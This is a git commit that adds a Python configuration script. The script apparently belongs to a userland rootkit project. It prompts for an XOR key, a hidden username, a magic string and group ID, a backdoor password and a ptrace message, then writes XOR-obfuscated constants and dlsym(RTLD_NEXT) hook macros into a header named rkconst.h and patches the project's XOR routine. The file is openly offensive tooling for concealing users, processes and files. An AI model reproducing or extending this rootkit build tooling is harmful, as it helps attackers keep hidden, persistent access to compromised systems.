c75460534450972499919184951760a1d5d1945f
blacchat <lolcow@protonmail.com>
2020-11-06 15:40:07 -0500

    Added config script

---
+++ config.py
@@ -0,0 +1,52 @@
+from xor import xor 
+import os 
+
+class col: 
+    BOLD = '\033[1m'
+    ENDC = '\033[0m'
+    BLNK = '\033[5m'
+    PASS = '\033[32m'
+    FAIL = '\033[31m'
+    NORM = '\033[34m'
+
+def main(): 
+    while True: 
+        key = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "key: ")
+        if len(key) != 1: 
+            print(col.BOLD + col.BLNK + col.FAIL + "[!] " + col.ENDC + "Key must be single ASCII char.")
+        else: 
+            break 
+    user = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "user: ")
+    magic = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "magic string: ")
+    magicgid = input(col.BOLD + col.NORM + "[>] " +  col.ENDC + "magic gid: ")
+    execpw = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "password: ")
+    ptrace = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "ptrace msg: ")
+    debug = input(col.BOLD + col.NORM + "[>] " + col.ENDC + "debug? [y/n]: ")
+    try:
+        f = open("rkconst.h", "w")
+        f.write("#ifndef RTLD_NEXT\n#define RTLD_NEXT ((void *) -11)\n#endif\n#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)\n#define CLEAN(var) clean(var, strlen(var))\n")
+        f.write("#define LIBC "  + "\"" + "/lib/libc.so.6" + "\"" + "\n")
+        f.write("#define PROC_PATH " + "\"" + xor("/proc/self/fd/%d", key) + "\"" + "\n")
+        f.write("#define PROC " + "\"" + xor("/proc", key) + "\"" + "\n")
+        f.write("#define USER " + "\"" + xor(user, key) + "\"" + "\n")
+        f.write("#define MAGIC " + "\"" + xor(magic, key) + "\"" + "\n")
+        f.write("#define EXECPW " + "\"" + xor(execpw, key) + "\"" + "\n")
+        f.write("#define PTRACE_MSG " + "\"" + xor(ptrace, key) + "\"" + "\n")
+        f.write("#define MAGICGID "  + magicgid + "\n")
+        if debug.lower() == "y": 
+            f.write("#define DEBUG\n") 
+        f.close()
+        here = os.path.dirname(os.path.realpath(__file__))
+        subdir = "utils"
+        filename = "xor.c" 
+        path = os.path.join(here, subdir, filename)
+        with open(path, "r") as f:
+            data = f.readlines()
+        data[2] = "for(int i=0; i<strlen(s); i++) s[i] ^= " + str(hex(ord(key))) + ";\n"
+        with open(path, "w") as f: 
+            f.write(''.join(data))
+        print(col.BOLD + col.PASS + "[~] " + col.ENDC + "Config successfully written.")
+    except IOError: 
+        print(col.BOLD + col.BLNK + col.FAIL + "[!] " + col.ENDC + "Error writing to file.")
+        exit() 
+main() 
